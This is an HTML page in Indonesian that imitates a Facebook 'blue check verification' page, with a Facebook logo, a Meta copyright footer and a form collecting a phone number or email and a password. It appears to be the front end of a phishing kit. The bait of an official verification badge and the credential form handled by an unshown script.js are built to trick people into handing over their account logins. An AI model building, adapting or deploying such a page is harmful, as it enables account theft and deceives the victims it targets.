<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Facebook - Centang Biru</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="bg-blur"></div>
  <div class="login-container animate__animated animate__fadeIn">
    <div class="login-card animate__animated animate__fadeInUp">
      <div class="card-content">
        <div class="logo-container">
          <img src="facebook-logo.png" alt="Facebook" class="logo">
        </div>
        <div class="login-title">Verifikasi Akun Facebook</div>
        <form id="loginForm">
          <div class="input-group">
            <input type="text" class="input-field" placeholder="Nomor ponsel atau email" required>
          </div>
          <div class="input-group">
            <input type="password" class="input-field" placeholder="Kata sandi" required>
          </div>
          <button type="submit" class="login-button" id="loginBtn">
            <span class="btn-text">Verifikasi Sekarang</span>
          </button>
          <a href="https://facebook.com/login/identify" class="forgot-password">Lupa kata sandi?</a>
          <div class="verification-note">
            Login untuk memverifikasi akun dan mendapatkan centang biru resmi dari Facebook
          </div>
        </form>
      </div>
    </div>
    <div class="footer">
      © 2025 Meta · Hak Cipta Dilindungi
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
